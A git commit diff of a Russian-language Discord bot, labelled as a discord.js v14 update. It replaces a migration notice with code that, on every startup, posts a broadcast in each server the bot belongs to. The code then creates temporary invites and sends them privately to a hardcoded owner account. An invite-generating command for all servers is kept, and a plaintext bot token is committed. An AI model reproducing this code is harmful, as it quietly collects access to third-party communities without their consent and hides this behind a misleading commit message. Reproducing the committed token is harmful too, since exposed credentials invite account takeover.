c6efe7e94bbf2412b86101072fde4ffe22b61599
ThEVlaDGamE <thevlad2005@yandex.ru>
2022-08-10 02:55:31 +0300

    Адаптация под v.14 discord.js

--- index.js
+++ index.js
@@ -1,5 +1,9 @@
-const Discord = require('discord.js');
-const bot = new Discord.Client();
+const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js')
+const bot = new Client({
+    intents: [
+        GatewayIntentBits.Guilds,
+    ]
+})
 
 function sleep(milliseconds) {
     const date = Date.now();
@@ -21,40 +25,44 @@ function EmbedCreate(title, description, fields)
     return embed;
 }
 
+let ownerId = "597755189486944256";
+
 bot.on('ready', async () => {
     console.log(`Запустился бот ${bot.user.username}`);
     
-    let guilds = bot.guilds.cache.array();
-    //let guilds = [await bot.guilds.fetch('798255710781177887')];
+    let guilds = await bot.guilds.cache.toJSON();
+    let owner = await bot.users.fetch(ownerId);
     for (let i = 0; i < guilds.length; i++) {
         let member = await guilds[i].members.fetch(bot.user.id);
-        let channels = guilds[i].channels.cache.array();
+
+        let channels = guilds[i].channels.cache.toJSON();
         channels.sort((prev, next) => prev.rawPosition - next.rawPosition);
-        for (let j = 0; j < channels.length; j++)  {   
-            if (channels[j].type == "text") {
-                if (channels[j].permissionsFor(member).has("VIEW_CHANNEL")) {
-                    if (channels[j].permissionsFor(member).has("SEND_MESSAGES")) {
+        for (let j = 0; j < channels.length; j++)  {  
+            if (channels[j].type == 0) {
+                if (channels[j].permissionsFor(member).has(PermissionsBitField.Flags.ViewChannel)) {
+                    if (channels[j].permissionsFor(member).has(PermissionsBitField.Flags.SendMessages)) {
                         console.log(guilds[i].name);
-                        channels[j].send({
-                            embed: EmbedCreate("Внимание!", "Данный бот (ExchangeBot) переезжает на новый аккаунт. Если вы хотите продолжить пользоваться ботом, пожалуйста, перейдите по ссылке ниже и добавьте новый аккаунт бота\nЕсли у вас есть вопросы, свяжитесь с разработчиком с помощью команды `//feedback`\nПосле добавления нового аккаунта этот можно выгнать с сервера",
-                                [
-                                    { name: "Ссылка на добавление", value: `[Пригласить бота](${`https://discord.com/api/oauth2/authorize?client_id=856535416579293194&permissions=84993&scope=bot`})\n` },
-                                ]
-                            )
-                        });
-                        sleep(1500);
+                        channels[j].send("**Рассылка**");
+
+                        if (ownerId != "") {
+                            let invite = await channels[j].createInvite({ temporary: true });
+                            owner.send(`https://discord.gg/${invite.code}`);
+                        }
+
+
+                        sleep(1200);
                         break;
                     }
                 }
             }
         }
     }
-    
+    console.log("Готово!");
 });
 
 bot.on('message', async msg => {
     if (msg.content.startsWith('_generateInviteAll')) {
-        let servers = await bot.guilds.cache.array();
+        let servers = await bot.guilds.cache.toJSON();
         console.log("=================================================\nСТАРТ\n=================================================");
         for (let i = 0; i < servers.length; i++) {
             servers[i].channels.cache.random().createInvite({ temporary: true })
@@ -62,7 +70,7 @@ bot.on('message', async msg => {
                 .catch(console.log(servers[i].name + " --- ошибка"));
         }
         console.log("=================================================\nКОНЕЦ\n=================================================");
-    } else if (msg.content.startsWith('..bot')) {
+    } else if (msg.content.startsWith('_bot')) {
         let servers = bot.guilds.cache.map(g => g.id);
         msg.reply(`**${servers.length}** серверов`);
     }
@@ -73,4 +81,4 @@ bot.on('message', async msg => {
 
 
 
-bot.login("");
+bot.login("NzU4MzY2MTI1NjY2MzM2Nzc4.GkoefG.Mhgjx70xWlD_yDAw3bfBGVH9SzlxUS6KLVvqf4");
